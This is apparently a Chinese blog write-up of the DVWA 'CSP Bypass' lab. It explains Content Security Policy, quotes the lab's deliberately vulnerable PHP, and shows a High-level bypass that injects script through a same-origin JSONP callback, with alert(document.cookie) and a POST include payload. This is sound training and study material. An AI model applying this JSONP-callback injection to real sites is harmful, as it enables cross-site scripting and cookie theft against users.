<img src="/images/ctf-web-dvwa/image-20221003130559616.png" alt="image-20221003130559616" style="zoom:67%;" />



# CSP(Content Security Policy)_Bypass

> CSP是内容安全策略，用来防止XSS跨站脚本攻击，浏览器通过**白名单制度**来明确哪些外部资源可以加载和执行。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入白名单的可信主机。
>
> 开启CSP的方法有两种：HTTP头中的`Content-Security-Policy`字段和网页的`meta`标签

例如若CSP的内容为：

```
Content-Security-Policy: script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:
```

则其含义是：

- 脚本：只信任当前域名
- `object`标签：不信任任何URL，即不加载任何资源
- 样式表：只信任http://cdn.example.org和[http://third-party.org](https://link.zhihu.com/?target=http%3A//third-party.org)
- 框架（frame）：必须使用HTTPS协议加载
- 其他资源：没有限制



参考内容：https://www.cnblogs.com/-zhong/p/10906270.html

<br>

## Low(还没搞)

从响应头中可以找到当前的白名单信息：

<img src="/images/ctf-web-dvwa/image-20221011211040099.png" alt="image-20221011211040099" style="zoom:67%;" />

```
Content-Security-Policy:
script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;
```

这里，`https://pastebin.com`是一个文本存储网站，属于攻击者可控的内容，可以把代码放到该网站上，然后将网址提交到靶场的文本框中进行包含



```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.

header($headerCSP);

# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://hastebin.com/raw/ohulaquzex
?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

<br>

## Medium(还没搞)



<br>

## High

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';"; //只信任自己的脚本
header($headerCSP);
?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>
<script src="source/high.js"></script> //这里调用脚本high.js
';
```



![image-20221011220051168](/images/ctf-web-dvwa/image-20221011220051168.png)

点击按钮并抓包,发现请求了服务端的`jsonp.php`并传了一个名为`callback`的参数

![image-20221011220220800](/images/ctf-web-dvwa/image-20221011220220800.png)

从页面源码来看,点击按钮时调用了`high.js`

代码为:

```javascript
function clickButton() {
    var s = document.createElement("script"); // 点击按钮时先创建了一个script标签
    s.src = "source/jsonp.php?callback=solveSum"; //设置script标签的src属性,也就是调用这个脚本时会发起一个对jsonp的请求,并传参数
    document.body.appendChild(s);//将s这个script标签添加为body的子节点
}
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

`clickButton`会创建一个`script`标签:

```
<script src="http://127.0.0.1:8090/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script>
```

由此定位到`jsonp.php`:

```php
<?php
header("Content-Type: application/json; charset=UTF-8");
if (array_key_exists ("callback", $_GET)) {
	$callback = $_GET['callback'];
} else {
	return "";
}
$outp = array ("answer" => "15");
echo $callback . "(".json_encode($outp).")";
?>
```

访问这个文件会得到:`json`格式的数据

![image-20221011220939837](/images/ctf-web-dvwa/image-20221011220939837.png)

回到前面的`high.js`,由于其创建的`script`标签引用的`jsonp.php`返回了`solveSum({"answer":"15"})`

那么此标签实际上要执行`solveSum`函数,且传入的参数是`{"answer":"15"}`,这个函数将15写到网页中

由此可见,因为可以给`jsonp.php`传参,因此其返回值是可控的,例如:

```
http://127.0.0.1:8090/dvwa/vulnerabilities/csp/source/jsonp.php?callback=alert(document.cookie)
```

![image-20221011222854769](/images/ctf-web-dvwa/image-20221011222854769.png)

但直接访问此文件并传参并不能让传入的脚本像`high.js`一样被当作js来执行

但是这里发现源码里还给了一个可以POST的`include`参数:

<img src="/images/ctf-web-dvwa/image-20221011223115468.png" alt="image-20221011223115468" style="zoom:67%;" />



该参数的值会被拼接到`body`中,因此可以在此处注入脚本: 通过`jsonp.php`的`callback`参数来使其执行:

POST的内容:

```
include=<script src=source/jsonp.php?callback=alert("hahaha")></script>
```

<img src="/images/ctf-web-dvwa/image-20221011223538298.png" alt="image-20221011223538298" style="zoom:50%;" />

成功注入代码(这里其实算是XSS了)

![image-20221011223524040](/images/ctf-web-dvwa/image-20221011223524040.png)

回到CSP上来，因为前面规定了只允许来自`self`的脚本,所以这里POST`include`时直接注入脚本是无法执行的:

<img src="/images/ctf-web-dvwa/image-20221011223820883.png" alt="image-20221011223820883" style="zoom:67%;" />

但是`jsonp.php`属于`self`下的文件,是被信任的,因此可以通过其来执行恶意脚本.



















































